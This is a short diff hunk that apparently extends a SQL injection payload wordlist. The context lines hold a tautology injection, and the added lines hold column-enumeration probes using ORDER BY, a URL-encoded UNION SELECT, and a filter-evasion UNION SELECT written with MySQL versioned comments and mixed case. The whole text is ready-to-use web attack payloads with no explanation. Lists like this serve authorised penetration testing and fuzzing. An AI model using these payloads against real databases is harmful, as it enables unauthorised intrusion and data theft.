@@ -123,3 +123,9 @@ x' or 1=1 or 'x'='y
 //
 //*
 */*
+'--+
+' order by 1,2--+
+%27%20UNION%20Select%201,2--+
+AND 0 order by 1—
+AND 0 /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,2,3,4,5 —
+
